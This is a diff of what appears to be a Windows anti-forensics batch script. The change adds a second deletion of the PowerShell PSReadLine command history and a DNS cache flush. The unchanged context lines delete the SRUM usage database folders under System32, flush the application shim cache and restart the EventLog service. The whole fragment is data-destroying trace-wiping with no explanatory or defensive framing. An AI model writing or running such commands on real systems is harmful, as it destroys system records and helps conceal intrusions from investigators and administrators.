@@ -23,9 +23,15 @@ for /d %i in ("C:\Windows\System32\sru\*") do rd /s /q "%i"
 del /f /q "%AppData%\Microsoft\Windows\PowerShell\PSReadLine*.txt"
 for /d %i in ("%AppData%\Microsoft\Windows\PowerShell\PSReadLine*") do rd /s /q "%i"
 
+del /f /q "%AppData%\Microsoft\Windows\PowerShell\PSReadLine*.txt"
+for /d %i in ("%AppData%\Microsoft\Windows\PowerShell\PSReadLine*") do rd /s /q "%i"
+
+ipconfig /flushdns
+
 Rundll32.exe apphelp.dll,ShimFlushCache
 
 start explorer.exe
 net start EventLog /y
 
 exit
+
